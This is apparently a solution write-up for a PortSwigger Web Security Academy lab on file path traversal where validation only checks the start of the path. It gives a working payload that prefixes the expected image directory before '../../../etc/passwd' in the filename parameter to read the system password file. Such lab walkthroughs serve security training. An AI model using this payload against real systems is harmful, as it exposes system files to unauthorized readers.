# File path traversal, validation of start of path
- Name: File path traversal, validation of start of path
- URL: https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path
- Level: Medium Time: 2 min
- Objective: retrieve the contents of the `/etc/passwd` file.
---------------------------------------------------------------------------------


## Solution
1. Find an image.
2. We usually add `../../../etc/passwd` right away but in here it will not work because it will check for the start of the file path.
3. Instead we will add `/var/www/images/` before the `../../../etc/passwd` like the next: `/image?filename=/var/www/images/../../../etc/passwd`
